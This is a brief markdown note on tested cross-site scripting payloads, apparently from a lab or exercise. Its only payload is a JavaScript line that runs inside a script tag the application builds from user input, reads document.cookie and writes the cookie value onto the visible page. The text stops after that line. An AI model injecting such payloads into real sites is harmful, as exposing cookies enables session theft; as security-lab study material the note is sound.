# Tested XSS Payloads

## Payload 1: Display Cookie on the Visible Page (Main Objective)
Since the application directly executes input inside a dynamically created `<script>` tag, we can manipulate the DOM directly to display the cookie value on the page:
```javascript
document.getElementById("output").innerHTML = "<b>" + document.cookie.split('=')[1] + "</b>";
